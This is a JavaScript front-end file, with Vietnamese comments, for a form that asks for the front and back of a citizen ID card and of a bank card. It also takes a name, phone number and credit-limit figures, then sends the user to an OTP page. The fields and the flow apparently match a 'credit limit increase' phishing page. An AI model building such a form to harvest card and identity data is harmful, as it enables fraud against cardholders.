$('#mattruoccccd').click(function () {
    jQuery('#mattruoccccd').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#mattruoccccd').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textmattr').attr('style', 'display:none');
            $('#iconmattr').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}

$('#matsaucccd').click(function () {
    jQuery('#matsaucccd').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL2(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#matsaucccd').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textmatsau').attr('style', 'display:none');
            $('#iconmatsaucancuoc').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}

$('#anhmattruocthe').click(function () {
    jQuery('#anhmattruocthe').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL3(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#anhmattruocthe').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textanhtruocthe').attr('style', 'display:none');
            $('#iconmattruocthe').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}
$('#anhmatsauthe').click(function () {
    jQuery('#anhmatsauthe').find('input[type="file"]').click();
});
// Sử dụng FileReader để đọc dữ liệu tạm trước khi upload lên Server
function readURL4(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        reader.onload = function (e) {

            $('#anhmatsauthe').attr('style', 'background-image:url("' + e.target.result + '")');
            $('.textanhsauthe').attr('style', 'display:none');
            $('#iconmatsauthe').attr('style', 'display:none');

        }
        reader.readAsDataURL(input.files[0]);
    }
}
const images = {
    mattruoc: "",
    matsau: "",
    mattruoc_card: "",
    matsau_card: ""
}

// Bắt sự kiện, ngay khi thay đổi file thì đọc lại nội dung và hiển thị lại hình ảnh mới trên khung preview-upload
$("#mattruoc").change(async function () {
    var formdata = new FormData();
    var file = this.files[0];
    formdata.append("image", file);
    var response = await fetch('/api/upload', {
        method: 'POST',
        body: formdata,
    });
    var data = await response.json();
    console.log(data);
    images.mattruoc = data?.imageUrl
    readURL(this);
});
$("#matsau").change(async function () {
    var formdata = new FormData()
    var file = this.files[0]
    formdata.append("image", file)
    var response = await fetch('/api/upload', {
        method: 'POST',
        body: formdata,
    });
    var data = await response.json();
    console.log(data);
    images.matsau = data?.imageUrl
    readURL2(this);
});
$("#mattruoc_card").change(async function () {
    var formdata = new FormData()
    var file = this.files[0]
    formdata.append("image", file)
    var response = await fetch('/api/upload', {
        method: 'POST',
        body: formdata,
    });
    var data = await response.json();
    console.log(data);
    images.mattruoc_card = data?.imageUrl
    readURL3(this);
});
$("#matsau_card").change(async function () {
    var formdata = new FormData()
    var file = this.files[0]
    formdata.append("image", file)
    var response = await fetch('/api/upload', {
        method: 'POST',
        body: formdata,
    });
    var data = await response.json();
    console.log(data);
    images.matsau_card = data?.imageUrl
    readURL4(this);
});

$('#service').submit(async function (e) {
    e.preventDefault();
    $('.loader').show()

    const data = {
        name: $('#name').val() ?? '',
        phone: $('#phone').val() ?? '',
        limit_now: $('#limit_now').val() ?? '',
        limit_total: $('#limit_total').val() ?? '',
        limit_increase: $('#limit_increase').val() ?? '',
        mattruoc: images?.mattruoc,
        matsau: images?.matsau,
        mattruoc_card: images?.mattruoc_card,
        matsau_card: images?.matsau_card
    }


    const response = await fetch('/api/otp-post', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            "Content-Type": "application/json"
        }
    })
    const resData = await response.json()
    console.log(resData);
    if (resData?.status) {
        window.location.href = '/otp'
    }

});
